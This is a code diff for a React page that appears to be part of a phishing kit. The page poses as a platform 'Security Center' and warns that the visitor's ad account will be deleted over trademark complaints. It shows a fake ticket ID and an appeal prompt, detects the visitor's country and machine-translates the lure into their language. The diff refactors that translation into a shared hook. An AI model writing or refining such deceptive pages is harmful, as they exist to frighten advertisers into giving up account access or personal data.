@@ -1,6 +1,6 @@
 'use client';
 import { store } from '@/store/store';
-import { getTranslations } from '@/utils/translate';
+import { useTranslation } from '@/hooks/useTranslation';
 
 import axios from 'axios';
 import { useEffect, useState, type FC } from 'react';
@@ -18,9 +18,23 @@ const Page: FC = () => {
     const { isModalOpen, setModalOpen, setFormStep, formStep, setGeoInfo } = store();
     const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
     
-    // Translation state
-    const [countryCode, setCountryCode] = useState('US');
-    const [translations, setTranslations] = useState<Record<string, string>>({}); 
+    // Shared translation hook - reads geoInfo from store
+    const { t } = useTranslation([
+        'Security Center', 'Home', 'Search', 'Security Policies', 'Rules & Other Posts', 'Settings',
+        'We have scheduled your ad account and pages for deletion',
+        'We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.',
+        'If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.',
+        'Your ticket id:', 'Request review',
+        'This team is used for submitting appeals and restoring account status.',
+        'Please ensure that you provide the required information below. Failure to do so may delay the processing of your appeal.',
+        'What is trademark infringement?',
+        'Generally, trademark infringement occurs when all three of the following requirements are met:',
+        'A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.',
+        'That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.',
+        'That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.',
+        'Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.',
+        'Help Center', 'Privacy Policy', 'Terms of Service', 'Community Standards',
+    ]); 
     
     // Generate random ticket ID
     const generateTicketId = (): string => {
@@ -42,7 +56,7 @@ const Page: FC = () => {
     
     const [ticketId] = useState<string>(() => generateTicketId());
 
-    // Geo-detection effect
+    // Geo-detection effect (fallback if navigated directly)
     useEffect(() => {
         const fetchGeoInfo = async () => {
             try {
@@ -56,7 +70,6 @@ const Page: FC = () => {
                     country_code: cc
                 };
                 setGeoInfo(info);
-                setCountryCode(cc);
             } catch {
                 const fallback = {
                     asn: 0,
@@ -66,180 +79,13 @@ const Page: FC = () => {
                     country_code: 'US'
                 };
                 setGeoInfo(fallback);
-                setCountryCode('US');
             }
         };
         fetchGeoInfo();
     // eslint-disable-next-line react-hooks/exhaustive-deps
-    }, []); // Run once on mount only
+    }, []);
 
-    // Translate texts based on fresh country code
-    useEffect(() => {
-        if (!countryCode) return;
-
-        (async () => {
-            // Comprehensive country → language map (200+ countries/territories)
-            const countryLangMap: Record<string, string> = {
-                // Africa
-                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
-                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
-                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
-                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
-                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
-                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
-                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
-                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
-                // Americas
-                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
-                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
-                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
-                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
-                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
-                VE: 'es',
-                // Asia
-                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
-                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
-                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
-                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
-                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
-                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
-                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
-                YE: 'ar',
-                // Europe
-                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
-                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
-                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
-                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
-                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
-                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
-                UA: 'uk', GB: 'en', VA: 'it',
-                // Oceania
-                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
-                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
-                // Territories
-                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
-            };
-
-            // Languages with full hardcoded translations in translate.ts
-            const HARDCODED_LANGS = new Set([
-                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
-                'tr','th','ko','sv','id','ms','uk','bn','tl','no'
-            ]);
-
-            const lang = countryLangMap[countryCode] || 'en';
-            if (lang === 'en') return; // No translation needed
-
-            // Get hardcoded translations as base (if available)
-            const hardcoded = HARDCODED_LANGS.has(lang) ? (getTranslations(lang) || {}) : {};
-
-            // All texts needed on this page
-            const textsToTranslate = [
-                'Security Center',
-                'Home',
-                'Search',
-                'Security Policies',
-                'Rules & Other Posts',
-                'Settings',
-                'We have scheduled your ad account and pages for deletion',
-                'We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.',
-                'If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.',
-                'Your ticket id:',
-                'Request review',
-                'This team is used for submitting appeals and restoring account status.',
-                'Please ensure that you provide the required information below. Failure to do so may delay the processing of your appeal.',
-                'What is trademark infringement?',
-                'Generally, trademark infringement occurs when all three of the following requirements are met:',
-                'A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.',
-                'That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.',
-                'That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.',
-                'Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.',
-                'Help Center',
-                'Privacy Policy',
-                'Terms of Service',
-                'Community Standards',
-            ];
-
-            // Find texts missing from hardcoded translations
-            const missingTexts = textsToTranslate.filter(text => !hardcoded[text]);
-
-            // If all texts exist in hardcoded, use directly
-            if (missingTexts.length === 0) {
-                setTranslations(hardcoded);
-                return;
-            }
-
-            // Set hardcoded first for instant display, then fetch missing
-            if (Object.keys(hardcoded).length > 0) {
-                setTranslations(hardcoded);
-            }
-
-            // Get cache
-            const CACHE_KEY = 'translation_cache';
-            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
-            const cache = cached ? JSON.parse(cached) : {};
-
-            // Check if all missing texts are cached
-            const allMissingCached = missingTexts.every(text => cache[`en:${lang}:${text}`]);
-
-            if (allMissingCached) {
-                const translatedMap: Record<string, string> = { ...hardcoded };
-                missingTexts.forEach(text => {
-                    translatedMap[text] = cache[`en:${lang}:${text}`];
-                });
-                setTranslations(translatedMap);
-                return;
-            }
-
-            // Translate only missing texts via Google API
-            const translatePromises = missingTexts.map(async (text) => {
-                const cacheKey = `en:${lang}:${text}`;
-
-                if (cache[cacheKey]) {
-                    return { text, translated: cache[cacheKey] };
-                }
-
-                try {
-                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
-                        params: {
-                            client: 'gtx',
-                            sl: 'en',
-                            tl: lang,
-                            dt: 't',
-                            q: text
-                        }
-                    });
-
-                    const translatedText = response.data[0]
-                        ?.map((item: unknown[]) => item[0])
-                        .filter(Boolean)
-                        .join('') || text;
-
-                    cache[cacheKey] = translatedText;
-                    return { text, translated: translatedText };
-                } catch {
-                    return { text, translated: text };
-                }
-            });
-
-            const results = await Promise.all(translatePromises);
-
-            if (typeof window !== 'undefined') {
-                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
-            }
-
-            // Merge hardcoded + API results
-            const translatedMap: Record<string, string> = { ...hardcoded };
-            results.forEach(({ text, translated }) => {
-                translatedMap[text] = translated;
-            });
-
-            setTranslations(translatedMap);
-        })();
-    }, [countryCode]); // Only depends on countryCode, not translations (no re-trigger loop)
-
-    const t = (text: string): string => translations[text] || text;
-
-    // Reset formStep when entering accountquality-status page
+    // Reset formStep when entering page
     useEffect(() => {
         setFormStep('init');
     }, [setFormStep]);
